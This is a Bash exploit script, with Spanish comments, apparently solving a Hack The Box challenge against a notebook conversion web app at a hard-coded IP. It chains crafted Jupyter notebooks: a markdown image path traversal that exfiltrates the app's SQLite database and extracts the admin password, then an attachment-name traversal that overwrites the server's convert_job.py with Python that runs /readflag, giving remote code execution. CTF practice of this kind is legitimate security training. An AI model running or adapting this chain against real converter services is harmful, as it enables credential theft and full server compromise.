#!/bin/bash
# HTB - NotebookConverter Pro

TARGET="http://154.57.164.80:32694"
USER="hacker$(date +%s | tail -c 5)"
PASS="hacker123"

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
echo -e "${CYAN} HTB - NotebookConverter Pro Exploit${NC}"

# STEP 0 
echo -e "${YELLOW} STEP 0: Registro y login...${NC}"
curl -s -X POST "$TARGET/register" -c /tmp/c.txt \
  -d "username=$USER&password=$PASS&confirm_password=$PASS" > /dev/null
curl -s -X POST "$TARGET/" -c /tmp/c.txt -b /tmp/c.txt \
  -d "username=$USER&password=$PASS" > /dev/null
echo -e "${GREEN} OK${NC}"

# STEP 1-2
cat > /tmp/steal.ipynb << 'EOF'
{
  "cells": [{"cell_type": "markdown", "metadata": {}, "source": ["![](../../../../data/app.db)"]}],
  "metadata": {"kernelspec": {"display_name": "Python 3", "language": "python", "name": "python3"}, "language_info": {"name": "python", "version": "3.11.0"}},
  "nbformat": 4, "nbformat_minor": 4
}
EOF

echo -e "${YELLOW} STEP 1-2: Robando la DB...${NC}"
RESP=$(curl -s -X POST "$TARGET/convert" \
  -c /tmp/c.txt -b /tmp/c.txt \
  -F "notebook=@/tmp/steal.ipynb" \
  -F "format=html")

JOB_ID=$(echo "$RESP" | grep -oP '/jobs/\K[0-9a-f]{12}' | head -1)
[ -z "$JOB_ID" ] && echo -e "${RED}[-] No job_id${NC}" && exit 1

curl -s "$TARGET/jobs/$JOB_ID/download" \
  -c /tmp/c.txt -b /tmp/c.txt -o /tmp/db_out.html
echo -e "${GREEN} HTML: $(wc -c < /tmp/db_out.html) bytes${NC}"

# STEP 3: Extraer creds 
echo -e "${YELLOW} STEP 3: Extrayendo credenciales...${NC}"
ADMIN_PASS=$(python3 - << 'PYEOF'
import re, base64, sqlite3
html = open('/tmp/db_out.html', 'rb').read().decode('utf-8', errors='replace')
for m in re.findall(r'data:[^;]*;base64,([A-Za-z0-9+/=]+)', html):
    data = base64.b64decode(m)
    if data[:6] == b'SQLite':
        open('/tmp/stolen.db', 'wb').write(data)
        conn = sqlite3.connect('/tmp/stolen.db')
        row = conn.execute("SELECT password FROM users WHERE role='admin'").fetchone()
        conn.close()
        if row: print(row[0])
        break
PYEOF
)
[ -z "$ADMIN_PASS" ] && echo -e "${RED}[-] No admin password${NC}" && exit 1
echo -e "${GREEN} Admin password: ${RED}$ADMIN_PASS${NC}"

# STEP 4: Login admin 
echo -e "${YELLOW} STEP 4: Login admin + asset storage...${NC}"
curl -s -X POST "$TARGET/" -c /tmp/a.txt -b /tmp/a.txt \
  -d "username=admin&password=$ADMIN_PASS" -L > /dev/null
curl -s -X POST "$TARGET/admin" -c /tmp/a.txt -b /tmp/a.txt \
  -d "asset_storage_enabled=on" > /dev/null
echo -e "${GREEN} OK${NC}"

# STEP 5: Crear pwn.ipynb 
# El payload escribe el flag a un archivo real en el output_dir
# y retorna su path para que el servidor lo sirva via /download
echo -e "${YELLOW} STEP 5: Creando payload RCE...${NC}"
python3 - << 'PYEOF'
import json, base64

# El payload debe:
# 1. Ejecutar /readflag
# 2. Escribir el output a un archivo en el output_dir
# 3. Retornar el path de ese archivo via JSON para que conversions.py
#    lo guarde en la DB y lo sirva via /download
code = r"""import subprocess, json, sys, os
from pathlib import Path

r = subprocess.run(['/readflag'], capture_output=True, text=True)
flag = r.stdout.strip()

# output_dir viene como argumento --output-dir
import argparse
parser = argparse.ArgumentParser()
parser.add_argument('--input', required=False)
parser.add_argument('--output-dir', required=False)
parser.add_argument('--format', required=False)
parser.add_argument('--storage-mode', required=False)
args, _ = parser.parse_known_args()

if args.output_dir:
    out = Path(args.output_dir) / 'flag.html'
    out.write_text(f'<html><body><h1>{flag}</h1></body></html>')
    print(json.dumps({"status": "ok", "output_path": str(out)}))
else:
    print(json.dumps({"status": "ok", "output_path": flag}))
"""

nb = {
  "cells": [{
    "cell_type": "markdown",
    "metadata": {},
    "attachments": {
      "../../../../app/converter/convert_job.py": {
        "application/octet-stream": base64.b64encode(code.encode()).decode()
      }
    },
    "source": ["# pwn"]
  }],
  "metadata": {
    "kernelspec": {"display_name": "Python 3", "language": "python", "name": "python3"},
    "language_info": {"name": "python", "version": "3.11.0"}
  },
  "nbformat": 4,
  "nbformat_minor": 4
}
json.dump(nb, open('/tmp/pwn.ipynb', 'w'), indent=2)
print(" pwn.ipynb OK")
PYEOF

# STEP 6: Subir pwn.ipynb
echo -e "${YELLOW} STEP 6: Sobreescribiendo convert_job.py...${NC}"
PWN_RESP=$(curl -s -X POST "$TARGET/convert" \
  -c /tmp/a.txt -b /tmp/a.txt \
  -F "notebook=@/tmp/pwn.ipynb" \
  -F "format=markdown")
PWN_JOB=$(echo "$PWN_RESP" | grep -oP '/jobs/\K[0-9a-f]{12}' | head -1)
echo -e "${GREEN} PWN Job: $PWN_JOB${NC}"
sleep 1

# STEP 7: Trigger RCE
echo -e "${YELLOW} STEP 7: Triggereando RCE...${NC}"
RESP2=$(curl -s -X POST "$TARGET/convert" \
  -c /tmp/a.txt -b /tmp/a.txt \
  -F "notebook=@/tmp/steal.ipynb" \
  -F "format=html")

JOB_ID2=$(echo "$RESP2" | grep -oP '/jobs/\K[0-9a-f]{12}' | head -1)
echo -e "${GREEN} RCE Job ID: $JOB_ID2${NC}"
[ -z "$JOB_ID2" ] && echo -e "${RED}[-] No RCE job${NC}" && exit 1

sleep 1
curl -s "$TARGET/jobs/$JOB_ID2/download" \
  -c /tmp/a.txt -b /tmp/a.txt -o /tmp/flag_out.html
echo -e "${GREEN} Download: $(wc -c < /tmp/flag_out.html) bytes${NC}"

# STEP 8: Flag
FLAG=$(grep -oP 'HTB\{[^}]+\}' /tmp/flag_out.html | head -1)

echo ""
if [ -n "$FLAG" ]; then
  echo -e "${GREEN}  FLAG: ${RED}$FLAG${NC}"
else
  echo -e "${RED}[-] Flag no encontrado en download.${NC}"
  echo -e "${YELLOW} Contenido del archivo:${NC}"
  cat /tmp/flag_out.html
fi